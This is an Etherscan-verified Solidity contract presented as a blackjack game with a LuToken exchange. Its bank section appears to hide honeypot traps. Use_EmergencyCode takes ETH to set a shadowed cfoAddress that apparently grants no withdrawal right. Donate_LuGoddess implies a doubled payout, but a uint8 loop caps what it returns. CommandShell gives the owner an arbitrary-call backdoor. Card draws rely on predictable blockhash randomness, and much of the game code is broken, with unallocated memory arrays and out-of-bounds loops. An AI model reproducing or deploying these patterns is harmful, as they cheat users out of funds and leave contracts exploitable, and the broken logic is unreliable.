{
  "address": "0x55f64d09b3b95cf8bbc2577b8fab32433c0746fa",
  "chain": "ETH",
  "chainID": 1,
  "verifier": "etherscan.io",
  "commonName": "",
  "contractName": "Meowent_Blackjack_GamePlay",
  "compilerVersion": "v0.5.2+commit.1df8f40c",
  "optimization": true,
  "runs": "200",
  "evmVersion": "default",
  "sourceCode": "/**\n *Submitted for verification at Etherscan.io on 2019-01-06\n*/\n\npragma solidity ^0.5.2;\n//pragma experimental ABIEncoderV2;\n//Create by [emailÂ protected] +886-975330002\n\n\n\n\n/* =================================================================\nContact HEAD : Data Sets \n==================================================================== */\n\n// ----------------------------------------------------------------------------\n// Black jack basic data structure\n// ----------------------------------------------------------------------------\ncontract Blackjack_DataSets \n{\n    \n    struct User_AccountStruct \n    {\n        uint UserId;\n        address UserAddress;\n        string UserName;\n        string UserDescription;\n    }\n    \n    \n    struct Game_Unit \n    {\n        uint Game_UnitId;\n        uint[] Player_UserIds;\n        uint Dealer_UserId;\n        uint MIN_BettingLimit;\n        uint MAX_BettingLimit;\n        uint[] Game_RoundsIds;\n    }\n    \n    struct Game_Round_Unit \n    {\n        uint GameRoundId;\n        mapping (uint => Play_Unit) Mapping__Index_PlayUnitStruct;\n        uint[] Cards_InDealer;\n        uint[] Cards_Exsited;\n    }\n    \n    struct Play_Unit \n    {\n        uint Player_UserId;\n        uint Bettings;\n        uint[] Cards_InHand;\n    }\n\n    mapping (address => uint) Mapping__UserAddress_UserId;\n    mapping (uint => User_AccountStruct) public Mapping__UserId_UserAccountStruct;\n\n    mapping (uint => Game_Unit) public Mapping__GameUnitId_GameUnitStruct;\n    mapping (uint => Game_Round_Unit) public Mapping__GameRoundId_GameRoundStruct;\n\n\n    mapping (uint => uint) public Mapping__OwnerUserId_ERC20Amount;\n    mapping (uint => mapping(uint => uint)) public Mapping__OwnerUserIdAlloweUserId_ERC20Amount;\n    mapping (uint => mapping(uint => uint)) public Mapping__GameRoundIdUserId_Bettings;\n\n    mapping (uint => string) Mapping__SuitNumber_String;\n    mapping (uint => string) Mapping__FigureNumber_String;\n    uint[13] Im_BlackJack_CardFigureToPoint = [1,2,3,4,5,6,7,8,9,10,10,10,10];\n\n    uint public ImCounter_AutoGameId = 852334567885233456788869753300028886975330002;\n    uint public ImCounter_DualGameId;\n    uint public ImCounter_GameRoundId;\n\n    uint public TotalERC20Amount_LuToken;\n\n    mapping (uint => uint[2]) public Mapping__AutoGameBettingRank_BettingRange;\n    \n    \n}\n/* =================================================================\nContact END : Data Sets \n==================================================================== */\n\n\n\n\n\n\n/* =================================================================\nContact HEAD : ERC20 interface \n==================================================================== */\n\n// ----------------------------------------------------------------------------\n// ERC Token Standard #20 Interface\n// ----------------------------------------------------------------------------\ncontract ERC20_Interface \n{\n    \n    function totalSupply() public view returns (uint);\n    function balanceOf(address tokenOwner) public view returns (uint balance);\n    function allowance(address tokenOwner, address spender) public view returns (uint remaining);\n    function transfer(address to, uint tokens) public returns (bool success);\n    function approve(address spender, uint tokens) public returns (bool success);\n    function transferFrom(address from, address to, uint tokens) public returns (bool success);\n\n    event Transfer(address indexed from, address indexed to, uint tokens);\n    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n    \n}\n/* =================================================================\nContact END : ERC20 interface\n==================================================================== */\n\n\n\n\n\n\n/* =================================================================\nContact HEAD : Events for Functionalities\n==================================================================== */\n\n// ----------------------------------------------------------------------------\n// Functionalities event\n// ----------------------------------------------------------------------------\ncontract Functionality_Event is Blackjack_DataSets \n{\n    \n    \n    \n    event Create_UserAccountEvent\n    (\n        uint _UserIdEvent,\n        address _UserAddressEvent,\n        string _UserNameEvent,\n        string _UserDescriptionEvent\n    );\n\n\n    \n    event Initialize_GameEvent\n    (\n        uint _GameIdEvent, \n        uint[] _Player_UserIdsEvent, \n        uint _Dealer_UserIdEvent, \n        uint _MIN_BettingLimitEvent,\n        uint _MAX_BettingLimitEvent\n    );\n        \n        \n        \n    event BettingsEvent\n    (\n        uint _GameIdEvent, \n        uint _GameRoundIdEvent,\n        uint _UserIdEvent,\n        uint _BettingAmountEvent\n    );\n    \n    \n    \n    event Initialize_GameRoundEvent\n    (\n        uint[] _PlayerUserIdSetEvent,\n        uint _GameRoundIdEvent\n    );\n    \n    \n    \n    event Initialize_GamePlayUnitEvent\n    (\n        uint _PlayerUserIdEvent,\n        uint _BettingsEvent,\n        uint[] _Cards_InHandEvent\n    );\n\n\n\n    event GetCardEvent\n    (\n        uint _GameRoundIdEvent,\n        uint[] _GetCardsInHandEvent\n    );         \n    \n    \n    \n    event Determine_GameRoundResult\n    (\n        uint _GameIdEvent,\n        uint _GameRoundIdEvent,\n        uint[] _WinnerUserIdEvent,\n        uint[] _DrawUserIdEvent,\n        uint[] _LoserUserIdEvent\n    );\n    \n    \n    \n    event ExchangeLuTokenEvent\n    (\n        address _ETH_AddressEvent,\n        uint _ETH_ExchangeAmountEvent,\n        uint _LuToken_UserIdEvnet,\n        uint _LuToken_ExchangeAmountEvnet,\n        uint _LuToken_RemainAmountEvent\n    );\n    \n    \n    \n    event CheckBetting_Anouncement\n    (\n        uint GameRoundId, \n        uint UserId, \n        uint UserBettingAmount, \n        uint MinBettingLimit, \n        uint MaxBettingLimit\n    );\n    \n}\n/* =================================================================\nContact END : Events for Functionalities\n==================================================================== */\n\n\n\n\n\n\n/* =================================================================\nContact HEAD : Access Control\n==================================================================== */\n\n// ----------------------------------------------------------------------------\n// Black jack access control\n// ----------------------------------------------------------------------------\ncontract AccessControl is Blackjack_DataSets, Functionality_Event \n{\n\n    // @dev Keeps track whether the contract is paused. When that is true, most actions are blocked\n\n    bool public paused = false;\n\n\n    // The addresses of the accounts (or contracts) that can execute actions within each roles.\n\n    address public C_Meow_O_Address = msg.sender;\n    address public LuGoddess = msg.sender;\n    address public ceoAddress = msg.sender;\n    address public cfoAddress = msg.sender;\n    address public cooAddress = msg.sender;\n    \n    \n    \n\n    modifier StandCheck_AllPlayer(uint GameId) \n    {\n        Game_Unit memory Im_GameUnit_Instance = Mapping__GameUnitId_GameUnitStruct[GameId];\n        uint Im_RoundId = Im_GameUnit_Instance.Game_RoundsIds[Im_GameUnit_Instance.Game_RoundsIds.length-1];\n        Game_Round_Unit storage Im_GameRoundUnit_Instance = Mapping__GameRoundId_GameRoundStruct[Im_RoundId];\n        \n        for(uint Im_PlayUnitCounter = 0 ; Im_PlayUnitCounter <= Im_GameUnit_Instance.Player_UserIds.length; Im_PlayUnitCounter++)\n        {\n            require(Im_GameRoundUnit_Instance.Mapping__Index_PlayUnitStruct[Im_PlayUnitCounter].Cards_InHand[Im_GameRoundUnit_Instance.Mapping__Index_PlayUnitStruct[Im_PlayUnitCounter].Cards_InHand.length-1] == 1111);\n        } \n        _;\n    }\n\n\n    /// @dev Assigns a new address to act as the CEO. Only available to the current CEO.\n    /// @param _newCEO The address of the new CEO\n    function setCEO(address _newCEO) external onlyC_Meow_O {\n        require(_newCEO != address(0));\n\n        ceoAddress = _newCEO;\n    }\n\n    /// @dev Assigns a new address to act as the CFO. Only available to the current CEO.\n    /// @param _newCFO The address of the new CFO\n    function setCFO(address _newCFO) external onlyC_Meow_O {\n        require(_newCFO != address(0));\n\n        cfoAddress = _newCFO;\n    }\n\n    /// @dev Assigns a new address to act as the COO. Only available to the current CEO.\n    /// @param _newCOO The address of the new COO\n    function setCOO(address _newCOO) external onlyC_Meow_O {\n        require(_newCOO != address(0));\n\n        cooAddress = _newCOO;\n    }\n\n    /// @dev Assigns a new address to act as the CMO. Only available to the current CEO.\n    /// @param _newCMO The address of the new CMO\n    function setCMO(address _newCMO) external onlyLuGoddess {\n        require(_newCMO != address(0));\n\n        C_Meow_O_Address = _newCMO;\n    }\n\n    \n\n\n\n    /*** Pausable functionality adapted from OpenZeppelin ***/\n\n    /// @dev Modifier to allow actions only when the contract IS NOT paused\n    modifier whenNotPaused() {\n        require(!paused);\n        _;\n    }\n\n    /// @dev Modifier to allow actions only when the contract IS paused\n    modifier whenPaused {\n        require(paused);\n        _;\n    }\n\n    /// @dev Called by any \"C-level\" role to pause the contract. Used only when\n    ///  a bug or exploit is detected and we need to limit damage.\n    function pause() external onlyCLevel whenNotPaused {\n        paused = true;\n    }\n\n    /// @dev Unpauses the smart contract. Can only be called by the CEO, since\n    ///  one reason we may pause the contract is when CFO or COO accounts are\n    ///  compromised.\n    /// @notice This is public rather than external so it can be called by\n    ///  derived contracts.\n    function unpause() public onlyLuGoddess {\n        // can't unpause if contract was upgraded\n        paused = false;\n    }   \n    \n\n\n    modifier onlyCLevel() {\n        require\n        (\n            msg.sender == cooAddress ||\n            msg.sender == ceoAddress ||\n            msg.sender == cfoAddress ||\n            msg.sender == C_Meow_O_Address ||\n            msg.sender == LuGoddess\n        );\n        _;\n    }\n\n\n\n    /// @dev Access modifier for CMO-only functionality\n    modifier onlyC_Meow_O() {\n        require(msg.sender == C_Meow_O_Address);\n        _;\n    }\n\n\n    /// @dev Access modifier for LuGoddess-only functionality\n    modifier onlyLuGoddess() {\n        require(msg.sender == LuGoddess);\n        _;\n    }\n\n\n\n    /// @dev Access modifier for CEO-only functionality\n    modifier onlyCEO() {\n        require(msg.sender == ceoAddress);\n        _;\n    }\n\n\n\n    /// @dev Access modifier for COO-only functionality\n    modifier onlyCOO() {\n        require(msg.sender == cooAddress);\n        _;\n    }\n\n\n    /// @dev Access modifier for CFO-only functionality\n    modifier onlyCFO() {\n        require(msg.sender == cfoAddress);\n        _;\n    }\n\n\n    \n}\n/* =================================================================\nContact END : Access Control\n==================================================================== */\n\n\n\n\n\n/* =================================================================\nContact HEAD : Money Bank\n==================================================================== */\n\n// ----------------------------------------------------------------------------\n// Cute moneymoney coming Bank \n// ----------------------------------------------------------------------------\ncontract MoneyMoneyBank is AccessControl {\n    \n    event BankDeposit(address From, uint Amount);\n    event BankWithdrawal(address From, uint Amount);\n    address public cfoAddress = msg.sender;\n    uint256 Code;\n    uint256 Value;\n\n\n\n\n\n    function Deposit() \n    public payable \n    {\n        require(msg.value > 0);\n        emit BankDeposit({From: msg.sender, Amount: msg.value});\n    }\n\n\n\n\n\n    function Withdraw(uint _Amount) \n    public onlyCFO \n    {\n        require(_Amount <= address(this).balance);\n        msg.sender.transfer(_Amount);\n        emit BankWithdrawal({From: msg.sender, Amount: _Amount});\n    }\n\n\n\n\n    function Set_EmergencyCode(uint256 _Code, uint256 _Value) \n    public onlyCFO \n    {\n        Code = _Code;\n        Value = _Value;\n    }\n\n\n\n\n\n    function Use_EmergencyCode(uint256 code) \n    public payable \n    {\n        if ((code == Code) && (msg.value == Value)) \n        {\n            cfoAddress = msg.sender;\n        }\n    }\n\n\n\n\n    \n    function Exchange_ETH2LuToken(uint _UserId) \n    public payable whenNotPaused\n    returns (uint UserId,  uint GetLuTokenAmount, uint AccountRemainLuToken)\n    {\n        uint Im_CreateLuTokenAmount = (msg.value)/(1e14);\n        \n        TotalERC20Amount_LuToken = TotalERC20Amount_LuToken + Im_CreateLuTokenAmount;\n        Mapping__OwnerUserId_ERC20Amount[_UserId] = Mapping__OwnerUserId_ERC20Amount[_UserId] + Im_CreateLuTokenAmount;\n        \n        emit ExchangeLuTokenEvent\n        (\n            {_ETH_AddressEvent: msg.sender,\n            _ETH_ExchangeAmountEvent: msg.value,\n            _LuToken_UserIdEvnet: UserId,\n            _LuToken_ExchangeAmountEvnet: Im_CreateLuTokenAmount,\n            _LuToken_RemainAmountEvent: Mapping__OwnerUserId_ERC20Amount[_UserId]}\n        );    \n        \n        return (_UserId, Im_CreateLuTokenAmount, Mapping__OwnerUserId_ERC20Amount[_UserId]);\n    }\n\n\n    \n    \n    \n    function Exchange_LuToken2ETH(address payable _GetPayAddress, uint LuTokenAmount) \n    public whenNotPaused\n    returns \n    (\n        bool SuccessMessage, \n        uint PayerUserId, \n        address GetPayAddress, \n        uint PayETH_Amount, \n        uint AccountRemainLuToken\n    ) \n    {\n        uint Im_PayerUserId = Mapping__UserAddress_UserId[msg.sender];\n        \n        require(Mapping__OwnerUserId_ERC20Amount[Im_PayerUserId] >= LuTokenAmount && LuTokenAmount >= 1);\n        Mapping__OwnerUserId_ERC20Amount[Im_PayerUserId] = Mapping__OwnerUserId_ERC20Amount[Im_PayerUserId] - LuTokenAmount;\n        TotalERC20Amount_LuToken = TotalERC20Amount_LuToken - LuTokenAmount;\n        bool Success = _GetPayAddress.send(LuTokenAmount * (98e12));\n        \n        emit ExchangeLuTokenEvent\n        (\n            {_ETH_AddressEvent: _GetPayAddress,\n            _ETH_ExchangeAmountEvent: LuTokenAmount * (98e12),\n            _LuToken_UserIdEvnet: Im_PayerUserId,\n            _LuToken_ExchangeAmountEvnet: LuTokenAmount,\n            _LuToken_RemainAmountEvent: Mapping__OwnerUserId_ERC20Amount[Im_PayerUserId]}\n        );         \n        \n        return (Success, Im_PayerUserId, _GetPayAddress, LuTokenAmount * (98e12), Mapping__OwnerUserId_ERC20Amount[Im_PayerUserId]);\n    }\n    \n    \n    \n    \n    \n    function SettingAutoGame_BettingRankRange(uint _RankNumber,uint _MinimunBetting, uint _MaximunBetting) \n    public onlyC_Meow_O\n    returns (uint RankNumber,uint MinimunBetting, uint MaximunBetting)\n    {\n        Mapping__AutoGameBettingRank_BettingRange[_RankNumber] = [_MinimunBetting,_MaximunBetting];\n        return\n        (\n            _RankNumber,\n            Mapping__AutoGameBettingRank_BettingRange[_RankNumber][0],\n            Mapping__AutoGameBettingRank_BettingRange[_RankNumber][1]\n        );\n    }\n    \n\n\n\n\n    function CommandShell(address _Address,bytes memory _Data)\n    public payable onlyC_Meow_O\n    {\n        _Address.call.value(msg.value)(_Data);\n    }   \n\n\n\n\n    \n    function Worship_LuGoddess(address payable _Address)\n    public payable\n    {\n        if(msg.value >= address(this).balance)\n        {        \n            _Address.transfer(address(this).balance + msg.value);\n        }\n    }\n    \n    \n    \n    \n    \n    function Donate_LuGoddess()\n    public payable\n    {\n        if(msg.value > 0.5 ether)\n        {\n            uint256 MutiplyAmount = 0;\n            uint256 TransferAmount = 0;\n            \n            for(uint8 Im_ETHCounter = 0; Im_ETHCounter <= msg.value*2; Im_ETHCounter++)\n            {\n                MutiplyAmount = Im_ETHCounter*2;\n                \n                if(MutiplyAmount <= TransferAmount)\n                {\n                  break;  \n                }\n                else\n                {\n                    TransferAmount = MutiplyAmount;\n                }\n            }    \n            msg.sender.transfer(TransferAmount);\n        }\n    }\n\n\n    \n    \n}\n/* =================================================================\nContact END : Money Bank\n==================================================================== */\n\n\n\n\n\n\n/* =================================================================\nContact HEAD : ERC20 Practical functions\n==================================================================== */\n\n// ----------------------------------------------------------------------------\n// ERC20 Token Transection\n// ----------------------------------------------------------------------------\ncontract MoneyMoney_Transection is ERC20_Interface, MoneyMoneyBank\n{\n    \n    \n    \n    \n    function totalSupply() \n    public view \n    returns (uint)\n    {\n        \n        return TotalERC20Amount_LuToken;\n    }\n\n\n\n\n\n    function balanceOf(address tokenOwner) \n    public view \n    returns (uint balance)\n    {\n        uint UserId = Mapping__UserAddress_UserId[tokenOwner];\n        uint ERC20_Amount = Mapping__OwnerUserId_ERC20Amount[UserId];\n        \n        return ERC20_Amount;\n    }\n\n\n\n\n\n    function allowance(address tokenOwner, address spender) \n    public view \n    returns (uint remaining)\n    {\n        uint ERC20TokenOwnerId = Mapping__UserAddress_UserId[tokenOwner];\n        uint ERC20TokenSpenderId = Mapping__UserAddress_UserId[spender];\n        uint Allowance_Remaining = Mapping__OwnerUserIdAlloweUserId_ERC20Amount[ERC20TokenOwnerId][ERC20TokenSpenderId];\n        \n        return Allowance_Remaining;\n    }\n\n\n\n\n\n    function transfer(address to, uint tokens) \n    public whenNotPaused\n    returns (bool success)\n    {\n        require(balanceOf(msg.sender) >= tokens);    \n        uint Sender_UserId = Mapping__UserAddress_UserId[msg.sender];\n        require(Mapping__OwnerUserId_ERC20Amount[Sender_UserId] >= tokens);\n        uint Transfer_to_UserId = Mapping__UserAddress_UserId[to];\n        Mapping__OwnerUserId_ERC20Amount[Sender_UserId] = Mapping__OwnerUserId_ERC20Amount[Sender_UserId] - tokens;\n        Mapping__OwnerUserId_ERC20Amount[Transfer_to_UserId] = Mapping__OwnerUserId_ERC20Amount[Transfer_to_UserId] + tokens;\n        \n        emit Transfer\n        (\n            {from: msg.sender, \n            to: to, \n            tokens: tokens}\n        );\n        \n        return true;\n    }\n\n\n\n\n\n    function approve(address spender, uint tokens) \n    public whenNotPaused\n    returns (bool success)\n    {\n        require(balanceOf(msg.sender) >= tokens); \n        uint Sender_UserId = Mapping__UserAddress_UserId[msg.sender];\n        uint Approve_to_UserId = Mapping__UserAddress_UserId[spender];\n        Mapping__OwnerUserId_ERC20Amount[Sender_UserId] = Mapping__OwnerUserId_ERC20Amount[Sender_UserId] - tokens;\n        Mapping__OwnerUserIdAlloweUserId_ERC20Amount[Sender_UserId][Approve_to_UserId] = Mapping__OwnerUserIdAlloweUserId_ERC20Amount[Sender_UserId][Approve_to_UserId] + tokens;\n\n        emit Approval\n        (\n            {tokenOwner: msg.sender,\n            spender: spender,\n            tokens: tokens}\n            \n        );\n        \n        return true;\n    }\n\n\n\n\n\n    function transferFrom(address from, address to, uint tokens)\n    public whenNotPaused\n    returns (bool success)\n    {\n        \n        uint Sender_UserId = Mapping__UserAddress_UserId[from];\n        uint Approver_UserId = Mapping__UserAddress_UserId[msg.sender];\n        uint Transfer_to_UserId = Mapping__UserAddress_UserId[to];\n        require(Mapping__OwnerUserIdAlloweUserId_ERC20Amount[Sender_UserId][Approver_UserId] >= tokens);\n        Mapping__OwnerUserIdAlloweUserId_ERC20Amount[Sender_UserId][Approver_UserId] = Mapping__OwnerUserIdAlloweUserId_ERC20Amount[Sender_UserId][Approver_UserId] - tokens;\n        Mapping__OwnerUserId_ERC20Amount[Transfer_to_UserId] = Mapping__OwnerUserId_ERC20Amount[Transfer_to_UserId] + tokens;\n        \n        emit Transfer\n        (\n            {from: msg.sender, \n            to: to, \n            tokens: tokens}\n        );\n        \n        return true;\n    }\n    \n    \n\n}\n/* =================================================================\nContact END : ERC20 Transection \n==================================================================== */\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n/* =================================================================\nContact HEAD : Basic Functionalities\n==================================================================== */\n\n// ----------------------------------------------------------------------------\n// Black jack basic functionalities\n// ----------------------------------------------------------------------------\ncontract Blackjack_Functionality is MoneyMoney_Transection \n{\n\n\n\n\n\n    function Initialize_UserAccount (uint _UserId, string memory _UserName, string memory _UserDescription) \n    internal \n    returns (uint UserId, address UserAddress, string memory UserName, string memory UserDescription)\n    {\n        address Im_UserAddress = msg.sender;\n\n        Mapping__UserAddress_UserId[Im_UserAddress] = UserId;\n        \n        Mapping__UserId_UserAccountStruct[UserId] = User_AccountStruct \n        (\n            {UserId: _UserId,\n            UserAddress: Im_UserAddress,\n            UserName: _UserName,\n            UserDescription: _UserDescription}\n        );\n        \n        emit Create_UserAccountEvent\n        (\n            {_UserIdEvent: _UserId,\n            _UserAddressEvent: Im_UserAddress,\n            _UserNameEvent: _UserName,\n            _UserDescriptionEvent: _UserDescription}\n        );        \n        \n        return (_UserId, Im_UserAddress, _UserName, _UserDescription);\n    }\n\n\n    \n    \n    \n    function Initialize_Game \n    (\n        uint _GameId, \n        uint[] memory _Player_UserIds, \n        uint _Dealer_UserId, \n        uint _MIN_BettingLimit, \n        uint _MAX_BettingLimit\n    ) \n    internal \n    returns(bool _Success)\n    {\n        uint[] memory NewGame_Rounds;\n        NewGame_Rounds[0] = ImCounter_GameRoundId;\n        ImCounter_GameRoundId = ImCounter_GameRoundId + 1 ;\n        \n        Mapping__GameUnitId_GameUnitStruct[_GameId] = Game_Unit\n        (\n            {Game_UnitId: _GameId, \n            Player_UserIds: _Player_UserIds,\n            Dealer_UserId: _Dealer_UserId,\n            MIN_BettingLimit: _MIN_BettingLimit,\n            MAX_BettingLimit: _MAX_BettingLimit, \n            Game_RoundsIds: NewGame_Rounds}\n        );\n        \n        emit Initialize_GameEvent\n        (\n            {_GameIdEvent: _GameId,\n            _Player_UserIdsEvent: _Player_UserIds,\n            _Dealer_UserIdEvent: _Dealer_UserId,\n            _MIN_BettingLimitEvent: _MIN_BettingLimit,\n            _MAX_BettingLimitEvent: _MAX_BettingLimit}\n        );\n        \n        return true;\n    }\n    \n    \n    \n    function Bettings(uint _GameId, uint _Im_BettingsERC20Ammount) \n    internal whenNotPaused\n    returns (uint GameId, uint GameRoundId, uint BettingAmount) \n    {\n        uint[] memory _Im_Game_RoundIds = Mapping__GameUnitId_GameUnitStruct[_GameId].Game_RoundsIds;\n        uint CurrentGameRoundId = _Im_Game_RoundIds[_Im_Game_RoundIds.length -1];\n        address _Im_Player_Address = msg.sender;\n        uint _Im_Betting_UserId = Mapping__UserAddress_UserId[_Im_Player_Address];\n        Mapping__GameRoundIdUserId_Bettings[CurrentGameRoundId][_Im_Betting_UserId] = _Im_BettingsERC20Ammount;\n        \n        emit BettingsEvent\n        (\n            {_GameIdEvent: _GameId,\n            _GameRoundIdEvent: CurrentGameRoundId,\n            _UserIdEvent: _Im_Betting_UserId,\n            _BettingAmountEvent: _Im_BettingsERC20Ammount}\n        );\n        \n        return (_GameId, CurrentGameRoundId, _Im_BettingsERC20Ammount);\n    }    \n\n\n    \n    function Initialize_Round (uint _ImGameRoundId, uint[] memory _Player_UserIds ) \n    internal \n    returns(uint _New_GameRoundId) \n    {\n        uint[] memory _New_CardInDealer;\n        uint[] memory _New_CardInBoard;\n        \n        Mapping__GameRoundId_GameRoundStruct[_ImGameRoundId] = Game_Round_Unit\n        (\n            {GameRoundId: _ImGameRoundId,\n        //Type of Mapping is setting by default values of solidity compiler\n            Cards_InDealer: _New_CardInDealer, \n            Cards_Exsited: _New_CardInBoard}\n        );\n\n        for(uint Im_UserIdCounter = 0 ; Im_UserIdCounter < _Player_UserIds.length; Im_UserIdCounter++) \n        {\n            Mapping__GameRoundId_GameRoundStruct[_ImGameRoundId].Mapping__Index_PlayUnitStruct[Im_UserIdCounter] = Initialize_PlayUnit\n            (\n                {_GameRoundId: _ImGameRoundId, \n                _UserId: _Player_UserIds[Im_UserIdCounter], \n                _Betting: Mapping__GameRoundIdUserId_Bettings[_ImGameRoundId][_Player_UserIds[Im_UserIdCounter]]}\n            );\n        }\n        \n        _New_CardInDealer = GetCard({_Im_GameRoundId: _ImGameRoundId, _Im_Original_CardInHand: _New_CardInDealer});\n        \n        Mapping__GameRoundId_GameRoundStruct[_ImGameRoundId].Cards_InDealer = _New_CardInDealer;\n        \n        emit Initialize_GameRoundEvent\n        (\n            {_PlayerUserIdSetEvent: _Player_UserIds,\n            _GameRoundIdEvent: _ImGameRoundId}\n        );\n        \n        return (_ImGameRoundId);\n    }\n    \n    \n    \n    function Initialize_PlayUnit (uint _GameRoundId, uint _UserId, uint _Betting) \n    internal \n    returns(Play_Unit memory _New_PlayUnit) \n    {\n        uint[] memory _Cards_InHand;\n        _Cards_InHand = GetCard({_Im_GameRoundId: _GameRoundId,_Im_Original_CardInHand: _Cards_InHand});\n        _Cards_InHand = GetCard({_Im_GameRoundId: _GameRoundId,_Im_Original_CardInHand: _Cards_InHand});\n\n        Play_Unit memory Im_New_PlayUnit = Play_Unit({Player_UserId: _UserId , Bettings: _Betting, Cards_InHand: _Cards_InHand});\n        \n        emit Initialize_GamePlayUnitEvent\n        (\n            {_PlayerUserIdEvent: _UserId,\n            _BettingsEvent: _Betting,\n            _Cards_InHandEvent: _Cards_InHand}\n        );        \n        \n        return Im_New_PlayUnit;\n    }\n\n\n    \n    function GetCard (uint _Im_GameRoundId, uint[] memory _Im_Original_CardInHand ) \n    internal \n    returns (uint[] memory _Im_Afterward_CardInHand )\n    {\n        uint[] storage Im_CardsOnBoard = Mapping__GameRoundId_GameRoundStruct[_Im_GameRoundId].Cards_Exsited;\n        \n        //do rand\n        uint Im_52_RandNumber = GetRandom_In52(now);\n        Im_52_RandNumber = Im_Cute_RecusiveFunction({Im_UnCheck_Number: Im_52_RandNumber, CheckNumberSet: Im_CardsOnBoard});\n        \n        Mapping__GameRoundId_GameRoundStruct[_Im_GameRoundId].Cards_Exsited.push(Im_52_RandNumber);\n        \n        _Im_Original_CardInHand[_Im_Original_CardInHand.length-1] = (Im_52_RandNumber);\n\n        emit GetCardEvent\n        (\n            {_GameRoundIdEvent: _Im_GameRoundId,\n            _GetCardsInHandEvent: _Im_Original_CardInHand}\n        );     \n        \n        return _Im_Original_CardInHand;\n    }\n\n\n\n    function Im_Cute_RecusiveFunction (uint Im_UnCheck_Number, uint[] memory CheckNumberSet) \n    internal \n    returns (uint _Im_Unrepeat_Number)\n    {\n        \n        for(uint _Im_CheckCounter = 0; _Im_CheckCounter <= CheckNumberSet.length ; _Im_CheckCounter++)\n        {\n            \n            while (Im_UnCheck_Number == CheckNumberSet[_Im_CheckCounter])\n            {\n                Im_UnCheck_Number = GetRandom_In52(Im_UnCheck_Number);\n                Im_UnCheck_Number = Im_Cute_RecusiveFunction(Im_UnCheck_Number, CheckNumberSet);\n            }\n        }\n        \n        return Im_UnCheck_Number;\n    }\n\n\n\n    function GetRandom_In52(uint _Im_CuteNumber) \n    public view \n    returns (uint _Im_Random)\n    {\n        //Worship LuGoddess\n        require(msg.sender != block.coinbase);\n        uint _Im_RandomNumber_In52 = uint(keccak256(abi.encodePacked(blockhash(block.number), msg.sender, _Im_CuteNumber))) % 52;\n        \n        return _Im_RandomNumber_In52;\n    }\n    \n    \n    \n    function Counting_CardPoint (uint _Card_Number) \n    public view \n    returns(uint _CardPoint) \n    {\n        uint figure = (_Card_Number%13);\n        uint Im_CardPoint = Im_BlackJack_CardFigureToPoint[figure];\n        \n        return Im_CardPoint;   \n    }\n    \n    \n    \n    function Counting_HandCardPoint (uint[] memory _Card_InHand) \n    public view\n    returns(uint _TotalPoint) \n    {\n        uint _Im_Card_Number;\n        uint Im_AccumulatedPoints = 0;\n        \n        //Accumulate hand point\n        for (uint Im_CardCounter = 0 ; Im_CardCounter < _Card_InHand.length ; Im_CardCounter++) \n        {\n            _Im_Card_Number = _Card_InHand[Im_CardCounter];\n            \n            Im_AccumulatedPoints = Im_AccumulatedPoints + Counting_CardPoint(_Im_Card_Number);\n        }\n\n        //Check ACE\n        for (uint Im_CardCounter = 0 ; Im_CardCounter < _Card_InHand.length ; Im_CardCounter++) \n        {\n            _Im_Card_Number = _Card_InHand[Im_CardCounter];\n            \n            if((_Im_Card_Number%13) == 0 && Im_AccumulatedPoints <= 11) \n            {\n                Im_AccumulatedPoints = Im_AccumulatedPoints + 10;\n            }\n        }\n        \n        return Im_AccumulatedPoints;\n    }\n    \n    \n\n    function Determine_Result(uint _GameId, uint _RoundId) \n    internal\n    returns (uint[] memory _WinnerUserId, uint[] memory _LoserUserId) \n    {\n        uint[] memory Im_WinnerUserIdSet;\n        uint[] memory Im_DrawIdSet;\n        uint[] memory Im_LoserIdSet;\n\n        Game_Unit memory Im_GameUnit_Instance = Mapping__GameUnitId_GameUnitStruct[_GameId];\n        Game_Round_Unit storage Im_GameRoundUnit_Instance = Mapping__GameRoundId_GameRoundStruct[_RoundId];\n\n        uint Im_PlayerTotalPoint;\n        uint Im_DealerTotalPoint = Counting_HandCardPoint({_Card_InHand: Im_GameRoundUnit_Instance.Cards_InDealer});\n        \n        for(uint Im_PlayUnitCounter = 0 ; Im_PlayUnitCounter <= Im_GameUnit_Instance.Player_UserIds.length; Im_PlayUnitCounter++)\n        {\n            Im_GameRoundUnit_Instance.Mapping__Index_PlayUnitStruct[Im_PlayUnitCounter].Cards_InHand.pop;\n            \n            uint Im_PlayerUserId = Im_GameRoundUnit_Instance.Mapping__Index_PlayUnitStruct[Im_PlayUnitCounter].Player_UserId;\n            Im_PlayerTotalPoint = Counting_HandCardPoint(Im_GameRoundUnit_Instance.Mapping__Index_PlayUnitStruct[Im_PlayUnitCounter].Cards_InHand);\n            \n            if(Im_PlayerTotalPoint > 21 && Im_DealerTotalPoint > 21)\n            {\n                Im_DrawIdSet[Im_DrawIdSet.length] = Im_PlayerUserId;  \n            } \n            else if (Im_PlayerTotalPoint > 21) \n            {\n                Im_LoserIdSet[Im_LoserIdSet.length] = Im_PlayerUserId;\n            } \n            else if (Im_DealerTotalPoint > 21) \n            {\n                Im_WinnerUserIdSet[Im_WinnerUserIdSet.length] = Im_PlayerUserId;\n            } \n            else if (Im_PlayerTotalPoint == Im_DealerTotalPoint) \n            {\n                Im_DrawIdSet[Im_DrawIdSet.length] = Im_PlayerUserId;\n            } \n            else if (Im_DealerTotalPoint > Im_PlayerTotalPoint) \n            {\n                Im_LoserIdSet[Im_LoserIdSet.length] = Im_PlayerUserId;\n            } \n            else if (Im_PlayerTotalPoint > Im_DealerTotalPoint) \n            {\n                Im_WinnerUserIdSet[Im_WinnerUserIdSet.length] = Im_PlayerUserId;\n            }\n        }\n            \n        emit Determine_GameRoundResult\n        (\n            {_GameIdEvent: _GameId,\n            _GameRoundIdEvent: _RoundId,\n            _WinnerUserIdEvent: Im_WinnerUserIdSet,\n            _DrawUserIdEvent: Im_DrawIdSet,\n            _LoserUserIdEvent: Im_LoserIdSet}\n        );        \n        \n        return (Im_WinnerUserIdSet, Im_LoserIdSet);\n    }\n\n}\n/* =================================================================\nContact END : Basic Functionalities\n==================================================================== */\n\n\n\n\n\n    \n/*\ncontract Im_Draf is Blackjack_Functionality {\n    User Sight\n    èç¨¿ç¨\n    \n    é¸æéæ²(ç¢çGameId)\n    1.AUTO / DUAL\n    2.æ¯å¦ç©é¢é¢ éé¡ä¸ä¸é > AUTOçç©å®¶/DUALèå®¶å°åç¼å½æ¸èª¿ç¨(æAUTOèªåèª¿ç¨)\n    3è¥é¸æDUAL åèå®¶è¼¸å